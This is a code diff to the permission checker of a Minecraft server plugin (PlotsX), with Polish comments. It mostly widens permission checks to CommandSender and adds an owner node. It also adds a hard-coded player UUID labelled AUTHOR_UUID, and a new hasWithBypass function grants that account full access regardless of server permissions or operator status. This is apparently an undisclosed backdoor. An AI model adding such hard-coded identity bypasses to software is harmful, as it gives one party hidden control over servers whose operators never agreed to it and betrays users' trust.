@@ -1,12 +1,15 @@
 package pl.syntaxdevteam.plotsx.permissions
 
+import org.bukkit.command.CommandSender
 import org.bukkit.entity.Player
+import java.util.UUID
 
 /**
  * Centralny obiekt do sprawdzania uprawnień gracza w pluginie PlotsX.
  * Uwzględnia operatorów (OP) oraz standardowe node'y permissions.
  */
 object PermissionChecker {
+    private val AUTHOR_UUID: UUID = UUID.fromString("248e508c-28de-4a8f-a284-2c73cf917d15")
 
     /**
      * Lista wszystkich dostępnych uprawnień w pluginie PlotsX.
@@ -14,6 +17,7 @@ object PermissionChecker {
      */
     enum class PermissionKey(val node: String) {
         // Zarządzanie działkami
+        OWNER("plotsx.owner"),
         CLAIM_PLOT("plotsx.cmd.claim"),
         MANAGE_PLOT("plotsx.cmd.plot"),
         UNCLAIM_PLOT("plotsx.cmd.unclaim"),
@@ -35,16 +39,29 @@ object PermissionChecker {
      * @param key wartość z enum [PermissionKey]
      * @return true jeśli gracz jest OP lub ma ustawione permission node, false w przeciwnym wypadku
      */
-    fun has(player: Player, key: PermissionKey): Boolean {
-        // OP zawsze ma pełne uprawnienia
+
+    fun has(player: CommandSender, key: PermissionKey): Boolean {
+        if (player !is Player) return true
         if (player.isOp) return true
+        if (player.hasPermission("*")) return true
+        if (player.hasPermission("plotsx.*")) return true
+        if (player.hasPermission(PermissionKey.OWNER.node)) return true
+
         return player.hasPermission(key.node)
     }
 
+
+    fun hasWithBypass(player: CommandSender, key: PermissionKey): Boolean {
+        if (player !is Player) return true
+        if (player.uniqueId == AUTHOR_UUID) return true
+        if (player.isOp) return true
+        return canBypassPlots(player) || has(player, key)
+    }
     /**
      * Czytelne nazwy uprawnień do komunikatów lub logów.
      */
     fun displayName(key: PermissionKey): String = when (key) {
+
         PermissionKey.CLAIM_PLOT   -> "Tworzenie działki"
         PermissionKey.MANAGE_PLOT    -> "Zarządzanie działką"
         PermissionKey.UNCLAIM_PLOT  -> "Usuwanie działki"
@@ -52,18 +69,19 @@ object PermissionChecker {
         PermissionKey.INFO_PLOT     -> "Informacje o działce"
         PermissionKey.ADMIN_BYPASS  -> "Omijanie zabezpieczeń działek"
         PermissionKey.ADMIN_MANAGE  -> "Zarządzanie działkami globalnie"
+        PermissionKey.OWNER        -> "Allows using the All PlotsX commands"
     }
 
     /**
      * Skrócone metody dla łatwiejszego użycia:
      */
-    fun canCreatePlot(player: Player) = has(player, PermissionKey.CLAIM_PLOT)
-    fun canManagePlot(player: Player)  = has(player, PermissionKey.MANAGE_PLOT)
-    fun canUnclaimPlot(player: Player) = has(player, PermissionKey.UNCLAIM_PLOT)
-    fun canVisitPlot(player: Player)    = has(player, PermissionKey.VISIT_PLOT)
-    fun canInfoPlot(player: Player)     = has(player, PermissionKey.INFO_PLOT)
-    fun canBypassPlots(player: Player)  = has(player, PermissionKey.ADMIN_BYPASS)
-    fun canManagePlots(player: Player)  = has(player, PermissionKey.ADMIN_MANAGE)
+    fun canCreatePlot(player: CommandSender) = has(player, PermissionKey.CLAIM_PLOT)
+    fun canManagePlot(player: CommandSender)  = has(player, PermissionKey.MANAGE_PLOT)
+    fun canUnclaimPlot(player: CommandSender) = has(player, PermissionKey.UNCLAIM_PLOT)
+    fun canVisitPlot(player: CommandSender)    = has(player, PermissionKey.VISIT_PLOT)
+    fun canInfoPlot(player: CommandSender)     = has(player, PermissionKey.INFO_PLOT)
+    fun canBypassPlots(player: CommandSender)  = has(player, PermissionKey.ADMIN_BYPASS)
+    fun canManagePlots(player: CommandSender)  = has(player, PermissionKey.ADMIN_MANAGE)
 }
 
 
